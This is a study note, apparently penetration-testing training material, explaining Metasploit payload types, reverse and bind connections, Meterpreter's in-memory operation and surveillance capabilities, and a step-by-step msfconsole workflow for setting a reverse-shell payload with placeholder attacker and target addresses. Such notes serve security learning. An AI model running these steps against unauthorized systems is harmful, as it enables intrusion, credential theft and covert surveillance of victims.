# Metasploit Payloads: Types and Implementation

### Payload Architecture

Metasploit payloads are modules that work with exploits to return a shell or establish a foothold on a target. They are categorized by how they interact with the target system.

|Payload Type|Description|Use Case|
|:--|:--|:--|
|**Singles (Inline)**|Self-contained; includes exploit and entire shellcode.|Use when **stability** is a priority and the exploit supports larger payload sizes.|
|**Stagers (Stage0)**|Small code blocks that initialize a connection (Reverse or Bind).|Use to bypass **size limits** of an exploit or for **initial connection**.|
|**Stages (Stage1)**|Large components downloaded by stagers; provide advanced features.|Use when **complex post-exploitation** (Meterpreter, VNC) is required.|

**Decision Point:** Staged payloads are identified by a `/` in the name (e.g., `shell/reverse_tcp`), whereas singles are often joined by underscores (e.g., `shell_reverse_tcp`).

---

### Connection Methodologies

The choice of connection type depends on the target's network security posture.

#### 1. Reverse Connections

The victim initiates an outbound connection to the attacker’s listener.

- **Why use:** Most effective for bypassing **strict inbound firewall rules**.
- **Implication:** Leverages the "security trust zone" typically granted to outbound traffic.

#### 2. Bind Connections

The attacker initiates a connection to a port opened on the victim machine.

- **Why use:** Useful when the attacker cannot receive inbound connections.
- **Failure Condition:** Often blocked by firewalls enforcing **inbound filtering**.

---

### Meterpreter Methodology

**Meterpreter** is a multi-faceted payload that operates via **DLL injection**.

- **Why it matters:** It resides entirely in **memory**, leaving no traces on the hard drive, which evades conventional forensic detection.
- **Attack Implication:** It provides a stable, persistent connection and allows for dynamic loading of plugins (e.g., Mimikatz) for automated post-exploitation.
- **Capabilities:** Includes keystroke capture, password hash collection, microphone tapping, and screenshotting.

---

### Operational Workflow: Selecting and Running Payloads

1. **Identify Available Payloads** Filter the extensive payload list to find specific types (e.g., Windows x64 Meterpreter reverse TCP).
    
    ```
    grep meterpreter grep reverse_tcp show payloads
    ```
    
    _Note: Using `grep` significantly reduces selection time._
    
2. **Select the Payload** After choosing an exploit module, set the desired payload by index number or name.
    
    ```
    set payload <PAYLOAD_NAME_OR_INDEX>
    ```
    
3. **Configure Parameters** Check required options to identify necessary IP and port settings.
    
    ```
    show options
    ```
    
4. **Set Connection Details** Define the attacker and target information.
    
    ```
    set LHOST <ATTACK_IP>
    set LPORT <PORT>
    set RHOSTS <TARGET_IP>
    ```
    
5. **Execute the Attack** Launch the exploit to deliver the stager and await the stage download.
    
    ```
    run
    ```
    

---

### Command Reference

#### Metasploit Interface

|Command|Purpose|
|:--|:--|
|`show payloads`|Lists all payloads compatible with the current module/context.|
|`grep <TERM> <COMMAND>`|Filters output for specific keywords.|
|`grep -c <TERM> <COMMAND>`|Returns a count of matching results.|
|`ifconfig`|Quickly identifies the `<ATTACK_IP>` within msfconsole.|

#### Meterpreter Session

Used once a session is established to interact with the target.

|Command|Purpose|
|:--|:--|
|`getuid`|Displays the user context Meterpreter is running under.|
|`help`|Lists available post-exploitation commands (File system, Networking, Privs).|
|`ls` / `cd`|Navigates the target file system within the Meterpreter environment.|
|`shell`|Drops into the target's native Command Line Interface (CLI).|

---

### Common Windows Payloads

| Payload                               | Type   | Goal                                              |
| :------------------------------------ | :----- | :------------------------------------------------ |
| `windows/x64/shell_reverse_tcp`       | Single | Direct reverse shell; stable, no stage download.  |
| `windows/x64/shell/reverse_tcp`       | Staged | Modular reverse shell; bypasses size limits.      |
| `windows/x64/exec`                    | Single | Executes a specific arbitrary command.            |
| `windows/x64/meterpreter/reverse_tcp` | Staged | Full Meterpreter suite via reverse TCP.           |
| `windows/x64/vncinject/reverse_tcp`   | Staged | Interactive VNC session via reflective injection. |